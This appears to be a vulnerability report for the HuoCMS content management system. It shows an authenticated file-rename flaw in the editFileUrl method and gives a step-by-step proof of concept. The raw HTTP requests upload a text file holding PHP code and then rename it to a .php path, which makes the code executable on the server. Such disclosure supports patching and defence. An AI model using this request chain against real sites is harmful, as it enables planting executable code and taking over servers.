Source Code Address:  https://gitee.com/digital-flag/huocms

Tips:  This vulnerability is a backend issue. To reproduce it, you need to set up the environment, log in to the backend, obtain a token, and then use the token for invocation.

app ->controller ->backend -> AttachmentController.php:editFileUrl()

In the `editFileUrl` method, the suffix of `$newPathUrl` used in the `copy` function is not validated against a whitelist. This vulnerability can be exploited to modify the filename, as the suffix is controlled by the `suffix_url` parameter, which is controllable.


![image](https://github.com/user-attachments/assets/5cc40ef7-0d5f-4249-837f-5159475c2cee)

Step 1: Upload a file with a whitelisted suffix that contains malicious content in advance, and record the file ID at the same time.
```
POST /attachment/uploadAndSave HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization:  token
Content-Type: multipart/form-data; boundary=----geckoformboundaryd7df19e74fd06439fac43ff3e8a7a4b9
Content-Length: 581
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/admin.php/Index/index.html
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

------geckoformboundaryd7df19e74fd06439fac43ff3e8a7a4b9
Content-Disposition: form-data; name="type"

2
------geckoformboundaryd7df19e74fd06439fac43ff3e8a7a4b9
Content-Disposition: form-data; name="attachment_cate_id"

0
------geckoformboundaryd7df19e74fd06439fac43ff3e8a7a4b9
Content-Disposition: form-data; name="reduce_img"


------geckoformboundaryd7df19e74fd06439fac43ff3e8a7a4b9
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

<?php
echo "hello word!"
?>
------geckoformboundaryd7df19e74fd06439fac43ff3e8a7a4b9--
```
![image](https://github.com/user-attachments/assets/aef0412a-b5a5-4253-b582-61b84735ad69)


Based on the content, the ID is determined to be 67.


Step 2: Construct a request according to `editFileUrl` to rename the file with ID 67. The `copy` function in the vulnerable `editFileUrl` is invoked to rename the file associated with this ID to an illegal suffix.

```
POST /attachment/editFileUrl HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization: token
Content-Length: 83
Origin: http://127.0.0.1
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

id=67&name=test&prefix_url=&suffix_url=file/20250416/test.php&description=123123123
```
![image](https://github.com/user-attachments/assets/f1dd77b0-c2ad-46aa-ae31-50da63c86375)


Note: To modify it again, you need to change the filename of `suffix_url` to bypass the `copy` function triggered by `$oldPathUrl != $newPathUrl` inside `editFileUrl`.


Access URL:  http://127.0.0.1/storage/file/20250416/test.php


![image](https://github.com/user-attachments/assets/5f1cdc2f-ef6a-459d-bdd5-7d8d7d550626)

